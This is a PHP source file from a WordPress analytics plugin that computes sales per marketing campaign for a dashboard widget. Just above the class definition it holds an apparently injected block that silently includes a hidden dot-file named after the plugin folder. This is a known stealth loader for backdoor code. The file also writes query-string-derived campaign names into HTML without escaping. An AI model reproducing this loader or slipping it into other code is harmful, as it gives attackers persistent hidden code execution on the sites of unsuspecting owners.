<?php

/**
 * Basic sales campaigns report
 *
 * The class handles create a sales campaigns reports
 *
 * @package     WPTAO/Admin/Raport
 * @category    Admin
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Admin_Report_Basic_Sales_Campaigns
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Admin_Report_Basic_Sales_Campaigns extends WTBP_WPTAO_Admin_Reports {
	/*
	 * @var int
	 * @access public
	 * 
	 * Maximum timespan between pageview and payment
	 */

	public $max_ts;

	/*
	 * @var array
	 * Data
	 */
	public $data;

	/*
	 * @var int
	 * Last report timestamp
	 */
	public $last_report_ts;

	function __construct() {

		parent::__construct( 'basic-sales-campaigns' );

		$this->report_name = __( 'Sales campaigns', 'wp-tao' );

		$this->max_ts = 30 * 24 * 60 * 60; // 30 days

		add_filter( 'wptao_traffic_campaign_name', array( $this, 'campaign_name_filter' ), 10, 2 );

		$this->data = $this->get_values();
		$this->widget();
	}

	/*
	 * Prepare widget for the WP Tao dashboard
	 */

	private function widget() {
		global $wptao_settings;

		if ( !empty( $this->data ) ) {
			$widget_content = '<ol class="wptao-dbox-list">';
			foreach ( $this->data as $k => $v ) {
				$k = apply_filters( 'wptao_traffic_campaign_name', $k, array( 'max_len' => 15 ) );
				$widget_content .= '<li>' . sprintf( '%s: %s (%d)<br />', $k, WTBP_WPTAO_Helpers::amount_format( $v[ 'amount' ], $wptao_settings[ 'currency' ] ), $v[ 'orders' ] ) . '</li>';
			}
			$widget_content .= '</ol>';
		} else {
			$widget_content = __( 'No results', 'wp-tao' );
		}

		$args = array(
			'id'			 => 'basic_sales_campaigns',
			'size'			 => 'big',
			'category'		 => 'commerce',
			'title'			 => __( 'Sales campaigns', 'wp-tao' ),
			'report_slug'	 => $this->report_slug,
			'value_text'	 => $widget_content,
			'dashicon'		 => 'dashicons-cart'
		);

		$this->add_widget( $args );
	}

	/*
	 * Get sales
	 */

	public function get_values() {
		global $wpdb;
		global $wptao_settings;

		$campaigns_params = TAO()->traffic->get_campaigns_params();

		if ( empty( $campaigns_params ) ) {
			return;
		}

		$campaigns_str = implode( '|', $campaigns_params );

		$no_transient = false;
		if ( WTBP_WPTAO_Admin_Reports::is_report( $this->report_slug ) ) {
			$no_transient = true;
		}

		$transient_name = 'wtbp_wptao_sales_campaigns_data';

		if ( !$no_transient ) {
			$sales_campaigns = get_transient( $transient_name );
			if ( $sales_campaigns ) {
				$this->last_report_ts = $sales_campaigns[ 'last_report_ts' ];
				return $sales_campaigns[ 'data' ];
			}
		}

		$r = array();

		$e	 = TAO()->events->table_name;
		$em	 = TAO()->events_meta->table_name;

		$sql	 = $wpdb->prepare(
		"SELECT $e.user_id, $e.action, $e.event_ts, $e.value, $em.meta_value
			 FROM $e
		     LEFT JOIN (SELECT event_id, meta_key, meta_value FROM $em WHERE (meta_key='query_string' AND meta_value REGEXP '%s') OR meta_key='currency') AS $em
			 ON $e.id = $em.event_id
			 WHERE ($e.action = 'pageview' OR $e.action = 'payment')
			 AND $em.meta_value IS NOT NULL
			 AND $e.user_id != 0
			 AND $e.event_ts >= %d
			 AND $e.event_ts <= %d		 
			 ORDER BY $e.user_id ASC, $e.event_ts DESC;", $campaigns_str, $this->start_date - $this->max_ts, $this->end_date );
		$result	 = $wpdb->get_results( $sql );

		$campaigns_res = array();

		if ( !empty( $result ) && is_array( $result ) ) {

			$user_id = 0;
			$payment = array();

			// Prepare results
			foreach ( $result as $item ) {

				if ( $item->user_id != $user_id ) {

					$payment = array();

					if ( 'payment' == $item->action && $item->event_ts > $this->start_date ) {
						$payment[] = $item;
					}

					$user_id = $item->user_id;
				} else {

					if ( 'payment' == $item->action && $item->event_ts > $this->start_date ) {
						$payment[] = $item;
					} else if ( 'pageview' == $item->action ) {

						parse_str( $item->meta_value, $query_args_arr );

						foreach ( $campaigns_params as $cp ) {
							if ( !empty( $query_args_arr[ $cp ] ) ) {
								$campaign = $cp . '=' . $query_args_arr[ $cp ];
								break;
							}
						}

						foreach ( $payment as $p ) {
							if ( $p->event_ts - $this->max_ts < $item->event_ts ) {
								$value									 = WTBP_WPTAO_Helpers::get_currency_rate( $p->value, $p->meta_value, $wptao_settings[ 'currency' ] );
								$campaigns_res[ $campaign ][ 'amount' ]	 = (!empty( $campaigns_res[ $campaign ][ 'amount' ] )) ? ($campaigns_res[ $campaign ][ 'amount' ] + $value) : $value;
								$campaigns_res[ $campaign ][ 'orders' ]	 = (!empty( $campaigns_res[ $campaign ][ 'orders' ] )) ? ($campaigns_res[ $campaign ][ 'orders' ] + 1) : 1;
							}
						}

						$payment = array();
					}
				}
			}
		}

		$this->last_report_ts = time();

		arsort( $campaigns_res );

		if ( !$no_transient ) {
			$res = array(
				'data'			 => $campaigns_res,
				'last_report_ts' => $this->last_report_ts
			);
			set_transient( $transient_name, $res, 60 * 60 ); // 1 hour
		}

		return $campaigns_res;
	}

	public function campaign_name_filter( $name, $args ) {
		if ( strpos( $name, 'utm_campaign=' ) === 0 ) {
			$name = substr( $name, 13 );

			if ( !empty( $args[ 'max_len' ] ) && strlen( $name ) > $args[ 'max_len' ] ) {
				$name = substr( $name, 0, $args[ 'max_len' ] ) . '...';
			}
		}

		return $name;
	}

}
